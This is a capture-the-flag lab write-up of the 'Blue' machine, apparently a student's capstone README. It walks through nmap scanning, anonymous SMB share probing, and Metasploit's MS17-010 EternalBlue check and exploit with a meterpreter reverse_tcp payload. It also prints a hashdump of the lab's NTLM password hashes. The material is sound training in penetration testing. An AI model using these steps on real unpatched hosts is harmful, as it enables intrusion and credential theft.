# New-Capstone-Lab-Blue-Machine-

<h2>**IP Address provided: 10.0.2.5**</h2>

This repository provides a comprehensive guide to the Blue Machine which is a Capture the Flag (CTF) challenge designed to test your skills in network scanning, web application testing, password cracking, privilege escalation, and system exploitation. This machine provides an opportunity to utilise a variety of tools and techniques commonly used in real-world penetration testing. You will encounter a combination of web-based vulnerabilities, system misconfigurations, and network-related challenges.

### Features:
- NMAP (Network Mapper)
NMAP is used for network scanning, identifying live hosts, and enumerating open ports/services on the target machine. Expect to perform full-service enumeration and version detection to discover potential vulnerabilities.
- Hashcat
Hashcat is employed to crack passwords or hash values found during the challenge, such as those retrieved from configuration files or databases.
- Dirb/Dirbuster/FFUF
These tools will be used for web directory and file brute-forcing to discover hidden resources or services within the web application. Expect to uncover directories with potentially sensitive data or misconfigurations.
- PHP Reverse Shell
The PHP reverse shell allows for remote code execution. You will use this shell to establish a reverse connection back to your local machine after exploiting a vulnerable web application or misconfiguration.
- Linpeas (Linux Privilege Escalation Enumeration)
Linpeas will help you scan for potential privilege escalation vectors once you've gained initial access to the system. It will identify misconfigurations, setuid binaries, and other weaknesses that can be leveraged for escalating privileges.
- Pspy64
Pspy64 is used to monitor the processes running on the target system in real time. It can help identify scheduled tasks, cron jobs, or other processes that might be running with elevated privileges, making it a valuable tool for post-exploitation.
- Bash Reverse Shell One-Liner
The bash reverse shell one-liner will be useful when you need to quickly establish a reverse shell connection, bypassing firewalls and security measures.
- Netcap (Network Capture)
Netcap will capture network traffic, allowing you to analyse packets, sniff traffic, and uncover hidden information such as unencrypted credentials, flags, or other clues that might assist you in further exploiting the system.


### Prerequisites:
Before starting the Academy Machine challenge, it is recommended to have basic knowledge and hands-on experience with the following tools and concepts:

- Networking Fundamentals: Knowledge of TCP/IP, ports, and protocols.
- NMAP: For network discovery and service enumeration.
- Hashcat: For password cracking and hash analysis.
- Dirb/Dirbuster/FFUF: Web directory and file brute-forcing tools.
- PHP Reverse Shell: Using PHP scripts to initiate reverse shells for exploitation.
- Linpeas: Linux privilege escalation enumeration script.
- Pspy64: To monitor processes running on the machine.
- Bash Reverse Shell One-Liner: Executing reverse shell using bash scripting.
- Netcap: For monitoring and capturing network traffic, analysing packets for clues.

<h2>Environments Used </h2>

- <b>Linux</b>
- <b>Windows</b>

<h2>Walk-through:</h2>

Started out by using Nmap to dearch for open ports on the target 10.0.2.5

nmap -A -p- -T4 10.0.2.5

![image](https://github.com/user-attachments/assets/801f2eaf-bd8b-466e-aa1c-920ccb0aa0c0)

I can see that port 139 tcp netbios-ssn Microsoft Windows netbios-ssn is open  
I can also see that port 445 tcp Windows 7 Ultimate 7601 Service Pack 1 Microsoft-ds (workgroup: WORKGROUP)

I will research the exploits for both of these.

**Port 139**  
NetBIOS stands for Network Basic Input Output System. It is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network. Software applications that run on a NetBIOS network locate and identify each other via their NetBIOS names. A NetBIOS name is up to 16 characters long and usually, separate from the computer name. Two applications start a NetBIOS session when one (the client) sends a command to “call” another client (the server) over TCP Port 139

**Port 445**  
While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.  
For instance, on Windows, SMB can run directly over TCP/IP without the need for NetBIOS over TCP/IP. This will use, as you point out, port 445. On other systems, you’ll find services and applications using port 139. This means that SMB is running with NetBIOS over TCP/IP**.**

I decided to attempt port 445 first as this was the one that stood out the most to me.

I listed the SMB shares using smbclient -L 10.0.2.5 and was asked for a password, i hit enter and ws able to view the share names.

I tried accessing admin with no password.  
smbclient \\10.0.2.5\ADMIN$  
Password for [WORKGROUP\kali]:  
tree connect failed: NT_STATUS_ACCESS_DENIED

I tried accessing C$ with no password.  
smbclient \\10.0.2.5\C$  
Password for [WORKGROUP\kali]:  
tree connect failed: NT_STATUS_ACCESS_DENIED

I was able to access IPC$ with no password.  
smbclient \\10.0.2.5\IPC$  
Password for [WORKGROUP\kali]:  
Try "help" to get a list of possible commands.

i tried ls  
smb: > ls  
NT_STATUS_INVALID_PARAMETER listing *

Further information gathering found this port 445 has an exploit called eternal blue.

![image](https://github.com/user-attachments/assets/6e6eb516-bddf-47bd-92a7-74d113102505)

Using Metasploit i searched for eternal blue and a few come up, i decided to use an auxiliary to start off with as this will be a check before launching an attack.

Unfortunately my windows lab crashed so i received connection time out.

Restarted the windows lab and retested.

msfconsole reloaded and ran search for eternal blue

![image](https://github.com/user-attachments/assets/2383d7df-56ef-40d7-acfb-d13f890170ec)

used no 1 (use 1)  
options  
set RHOSTS to IP Address of the machine scanning.  
Run the scan against the machine.

[+] 10.0.2.5:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)  
[*] 10.0.2.5:445 - Scanned 1 of 1 hosts (100% complete)  
[*] Auxiliary module execution completed

Now we have confirmed that the system is vulnerable to eternal blue we look at what exploits are available.  
search eternal blue to bring up the menu again.  
no 3 looks promising so we will use this one as the other says win8 and we know its a windows 7 machine.

use 3  
options  
set rhosts to IP Address  
this module has a check feature so lets check it.

Type check and enter  
msf6 exploit(windows/smb/ms17_010_eternalblue) > check

[*] 10.0.2.5:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check  
[+] 10.0.2.5:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)  
[*] 10.0.2.5:445 - Scanned 1 of 1 hosts (100% complete)  
[+] 10.0.2.5:445 - The target is vulnerable.

This shows the same as the scanner so we know this should work.

So we now need to set a payload.

We know from the previous scans that this machine is 64 bit and sometimes payloads are set to 32bit so we need to be on the safe side and set the payload to 64bit.  
we are also going to use a meterpreter shell as we want a nice interface and we are going to set a reverse-tcp

Type in options.  
Set LHOST to eth0 or your IP Address.

RUN this

![image](https://github.com/user-attachments/assets/50d7aa97-413b-4d8f-a12a-e72c4bcc4642)

set payload windows/x64/meterpreter/reverse_tcp

Run  
This will run through trying to access, sometimes it wont happen the first time so give another go. Mine worked first time which was great.

Sorry, my screenshot wouldnt work so i took a picture of the screen.

![image](https://github.com/user-attachments/assets/459ae81b-4061-4093-a6d7-d429950a640d)

Eternal Blue has been out for sometime now but is still successful in infiltrating machines that have not been updated or cant be updated.

Type in Hashdump.

meterpreter > hashdump  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::  
user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::

Now we have the hashes for the Administrator, Guest, Home Group and User:1000.

We can use this to try and crack it, we can use pass the hash etc.




